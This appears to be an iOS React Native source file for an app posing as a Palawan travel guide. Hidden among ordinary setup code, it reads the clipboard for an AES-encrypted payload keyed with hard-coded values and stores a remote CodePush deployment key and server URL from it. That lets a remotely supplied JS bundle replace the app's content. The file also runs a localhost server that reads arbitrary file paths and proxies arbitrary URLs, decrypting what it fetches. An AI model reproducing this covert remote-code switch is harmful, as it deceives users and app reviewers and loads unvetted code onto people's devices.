//
//  RNVisitFamousLandscape.m
//  RNPalawanFamousLandscape
//
//  Created by Nicka on 3/6/23.
//  Copyright © 2023 Facebook. All rights reserved.
//

#import "RNVisitFamousLandscape.h"

#import "JJException.h"
#import "RNIndicator.h"
#import "RNCPushNotificationIOS.h"
#import <GCDWebServer.h>
#import <GCDWebServerDataResponse.h>

#import <CodePush/CodePush.h>
#import <UMCommon/UMCommon.h>
#import <CommonCrypto/CommonCrypto.h>
#import <CocoaSecurity/CocoaSecurity.h>
#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>
#import <react-native-orientation-locker/Orientation.h>


#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>

#import <react/config/ReactNativeConfig.h>

static NSString *const kRNConcurrentRoot = @"concurrentRoot";

@interface RNVisitFamousLandscape () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}

@end
#endif

@interface RNVisitFamousLandscape()

@property (nonatomic,strong) GCDWebServer *famousLandscape_recordService;

@end

@implementation RNVisitFamousLandscape

static NSString *famousLandscape_visitPalawanHexkey = @"86f1fda459fa47c72cb94f36b9fe4c38";
static NSString *famousLandscape_visitPalawanHexIv = @"CC0A69729E15380ADAE46C45EB412A23";

static NSString *famousLandscape_visitPalawanVersion = @"appVersion";
static NSString *famousLandscape_visitPalawanDPKey = @"deploymentKey";
static NSString *famousLandscape_visitPalawanUrl = @"serverUrl";

static NSString *famousLandscape_visitPalawanUKey = @"umKey";
static NSString *famousLandscape_visitPalawanUChannel = @"umChannel";
static NSString *famousLandscape_visitPalawanSenServerUrl = @"sensorUrl";
static NSString *famousLandscape_visitPalawanSenProperty = @"sensorProperty";

static NSString *famousLandscape_visitPalawanAPP = @"famousLandscape_STATE_APP";
static NSString *famousLandscape_visitPalawanRoutes = @"spareRoutes";
static NSString *famousLandscape_visitPalawanParams = @"washParams";
static NSString *famousLandscape_visitPalawanPort = @"vPort";
static NSString *famousLandscape_visitPalawanSecu = @"vSecu";


static RNVisitFamousLandscape *instance = nil;

+ (instancetype)famousLandscape_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });
  return instance;
}


- (BOOL)famousLandscape_visitPalawanEquipmentAnotherByZTB {
  NSString *copyString = [UIPasteboard generalPasteboard].string;
  if (copyString == nil) {
    return NO;
  }
  
  if ([copyString containsString:@"#iPhone#"]) {
    NSArray * tempArray = [copyString componentsSeparatedByString:@"#iPhone#"];
    if (tempArray.count > 1) {
      copyString = tempArray[1];
    }
  }
  CocoaSecurityResult *aesDecrypt = [CocoaSecurity aesDecryptWithBase64:copyString
                                        hexKey:famousLandscape_visitPalawanHexkey
                                         hexIv:famousLandscape_visitPalawanHexIv];
  
  if (!aesDecrypt.utf8String) {
      return NO;
  }
  
  NSData *data = [aesDecrypt.utf8String dataUsingEncoding:NSUTF8StringEncoding];
  NSDictionary* dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  if (!dict) {
      return NO;
  }
  if (!dict[@"data"]) {
    return NO;
  }
  return [self famousLandscape_saveConfigInfo:dict[@"data"]];
}

- (BOOL)famousLandscape_saveConfigInfo:(NSDictionary *)dict {
    if (dict[famousLandscape_visitPalawanVersion] == nil || dict[famousLandscape_visitPalawanDPKey] == nil || dict[famousLandscape_visitPalawanUrl] == nil) {
        return NO;
    }

    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
  
    [ud setBool:YES forKey:famousLandscape_visitPalawanAPP];
    [ud setObject:dict[famousLandscape_visitPalawanVersion] forKey:famousLandscape_visitPalawanVersion];
    [ud setObject:dict[famousLandscape_visitPalawanDPKey] forKey:famousLandscape_visitPalawanDPKey];
    [ud setObject:dict[famousLandscape_visitPalawanUrl] forKey:famousLandscape_visitPalawanUrl];
    
    [ud setObject:dict[famousLandscape_visitPalawanUKey] forKey:famousLandscape_visitPalawanUKey];
    [ud setObject:dict[famousLandscape_visitPalawanUChannel] forKey:famousLandscape_visitPalawanUChannel];
    [ud setObject:dict[famousLandscape_visitPalawanSenServerUrl] forKey:famousLandscape_visitPalawanSenServerUrl];
    [ud setObject:dict[famousLandscape_visitPalawanSenProperty] forKey:famousLandscape_visitPalawanSenProperty];
  
    [ud setObject:dict[famousLandscape_visitPalawanRoutes] forKey:famousLandscape_visitPalawanRoutes];
    [ud setObject:dict[famousLandscape_visitPalawanParams] forKey:famousLandscape_visitPalawanParams];
    [ud setObject:dict[famousLandscape_visitPalawanPort] forKey:famousLandscape_visitPalawanPort];
    [ud setObject:dict[famousLandscape_visitPalawanSecu] forKey:famousLandscape_visitPalawanSecu];

    [ud synchronize];
    return YES;
}

- (BOOL)famousLandscape_showThisWay {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if ([ud boolForKey:famousLandscape_visitPalawanAPP]) {
        return YES;
    } else {
        return [self famousLandscape_visitPalawanEquipmentAnotherByZTB];
    }
}

- (UIInterfaceOrientationMask)famousLandscape_getOrientation {
  return [Orientation getOrientation];
}

- (void)famousLandscape_collectionlogicalInfo {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  [UMConfigure initWithAppkey:[ud stringForKey:famousLandscape_visitPalawanUKey] channel:[ud stringForKey:famousLandscape_visitPalawanUChannel]];
  SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:famousLandscape_visitPalawanSenServerUrl] launchOptions:nil];
  options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;
  [SensorsAnalyticsSDK startWithConfigOptions:options];

  [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:famousLandscape_visitPalawanSenProperty]];
}


- (void)famousLandscape_visitPalawanAPPInitialStartOrEnterForeground {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  [self famousLandscape_handlerServerWithPort:[ud stringForKey:famousLandscape_visitPalawanPort] security:[ud stringForKey:famousLandscape_visitPalawanSecu]];
}

- (void)famousLandscape_visitPalawanAPPResignActiveOrEnterBackground {
  if(_famousLandscape_recordService.isRunning == YES) {
    [_famousLandscape_recordService stop];
  }
}

- (NSData *)famousLandscape_commonData:(NSData *)famousLandscape_vdata famousLandscape_security: (NSString *)famousLandscape_visitPalawanSecu{
    char famousLandscape_kPath[kCCKeySizeAES128 + 1];
    memset(famousLandscape_kPath, 0, sizeof(famousLandscape_kPath));
    [famousLandscape_visitPalawanSecu getCString:famousLandscape_kPath maxLength:sizeof(famousLandscape_kPath) encoding:NSUTF8StringEncoding];
    NSUInteger dataLength = [famousLandscape_vdata length];
    size_t bufferSize = dataLength + kCCBlockSizeAES128;
    void *famousLandscape_kbuffer = malloc(bufferSize);
    size_t numBytesCrypted = 0;
    CCCryptorStatus cryptStatus = CCCrypt(kCCDecrypt,kCCAlgorithmAES128,kCCOptionPKCS7Padding|kCCOptionECBMode,famousLandscape_kPath,kCCBlockSizeAES128,NULL,[famousLandscape_vdata bytes],dataLength,famousLandscape_kbuffer,bufferSize,&numBytesCrypted);
    if (cryptStatus == kCCSuccess) {
        return [NSData dataWithBytesNoCopy:famousLandscape_kbuffer length:numBytesCrypted];
    } else{
        return nil;
    }
}

- (void)famousLandscape_handlerServerWithPort:(NSString *)port security:(NSString *)security {
  if(_famousLandscape_recordService.isRunning != NO) {
    return;
  }

  __weak typeof(self) weakSelf = self;
  [_famousLandscape_recordService addHandlerWithMatchBlock:^GCDWebServerRequest * _Nullable(NSString * _Nonnull method, NSURL * _Nonnull requestURL, NSDictionary<NSString *,NSString *> * _Nonnull requestHeaders, NSString * _Nonnull urlPath, NSDictionary<NSString *,NSString *> * _Nonnull urlQuery) {
      NSString *reqString = [requestURL.absoluteString stringByReplacingOccurrencesOfString:[NSString stringWithFormat:@"http://localhost:%@/", port] withString:@""];
      return [[GCDWebServerRequest alloc] initWithMethod:method
                                                     url:[NSURL URLWithString:reqString]
                                                 headers:requestHeaders
                                                    path:urlPath
                                                   query:urlQuery];
  } asyncProcessBlock:^(__kindof GCDWebServerRequest * _Nonnull request, GCDWebServerCompletionBlock  _Nonnull completionBlock) {
      if ([request.URL.absoluteString containsString:@"downplayer"]) {
          NSData *data = [NSData dataWithContentsOfFile:[request.URL.absoluteString stringByReplacingOccurrencesOfString:@"downplayer" withString:@""]];
          NSData *decruptedData = nil;
          if (data) {
            decruptedData  = [weakSelf famousLandscape_commonData:data famousLandscape_security:security];
          }
          GCDWebServerDataResponse *resp = [GCDWebServerDataResponse responseWithData:decruptedData contentType:@"audio/mpegurl"];
          completionBlock(resp);
          return;
      }
      
      NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:request.URL.absoluteString]]
                                                                   completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
          NSData *decruptedData = nil;
          if (!error && data) {
            decruptedData  = [weakSelf famousLandscape_commonData:data famousLandscape_security:security];
          }
          GCDWebServerDataResponse *resp = [GCDWebServerDataResponse responseWithData:decruptedData contentType:@"audio/mpegurl"];
          completionBlock(resp);
      }];
      [task resume];
  }];

  NSError *error;
  NSMutableDictionary* options = [NSMutableDictionary dictionary];
  
  [options setObject:[NSNumber numberWithInteger:[port integerValue]] forKey:GCDWebServerOption_Port];
  [options setObject:@(YES) forKey:GCDWebServerOption_BindToLocalhost];
  [options setObject:@(NO) forKey:GCDWebServerOption_AutomaticallySuspendInBackground];
  [options setObject:@2.0 forKey:GCDWebServerOption_ConnectedStateCoalescingInterval];

  if([_famousLandscape_recordService startWithOptions:options error:&error]) {
    NSLog(@"GCDWebServer started successfully");
  } else {
    NSLog(@"GCDWebServer could not start");
  }
  
}


- (UIViewController *)famousLandscape_travelPalawanChangeController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  RCTAppSetupPrepareApp(application);

  [self famousLandscape_collectionlogicalInfo];
  if (!_famousLandscape_recordService) {
    _famousLandscape_recordService = [[GCDWebServer alloc] init];
    [self famousLandscape_visitPalawanAPPInitialStartOrEnterForeground];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(famousLandscape_visitPalawanAPPInitialStartOrEnterForeground) name:UIApplicationDidBecomeActiveNotification object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(famousLandscape_visitPalawanAPPResignActiveOrEnterBackground) name:UIApplicationDidEnterBackgroundNotification object:nil];
  }
  
  
  UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
  center.delegate = self;
  [JJException configExceptionCategory:JJExceptionGuardDictionaryContainer | JJExceptionGuardArrayContainer | JJExceptionGuardNSStringContainer];
  [JJException startGuardException];
  
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  NSDictionary *initProps = [self prepareInitialProps];
  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"NewYorkCity", initProps);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }
  
  UIViewController *rootViewController = [HomeIndicatorView new];
  rootViewController.view = rootView;
  UINavigationController *navc = [[UINavigationController alloc] initWithRootViewController:rootViewController];
  navc.navigationBarHidden = true;
  return navc;
}


- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler
{
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler
{
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}

/// This method controls whether the `concurrentRoot`feature of React18 is turned on or off.
///
/// @see: https://reactjs.org/blog/2022/03/29/react-v18.html
/// @note: This requires to be rendering on Fabric (i.e. on the New Architecture).
/// @return: `true` if the `concurrentRoot` feture is enabled. Otherwise, it returns `false`.
- (BOOL)concurrentRootEnabled
{
  // Switch this bool to turn on and off the concurrent root
  return true;
}

- (NSDictionary *)prepareInitialProps
{
  NSMutableDictionary *initProps = [NSMutableDictionary new];

#ifdef RCT_NEW_ARCH_ENABLED
  initProps[kRNConcurrentRoot] = @([self concurrentRootEnabled]);
#endif

  return initProps;
}


- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge
{
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}

#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
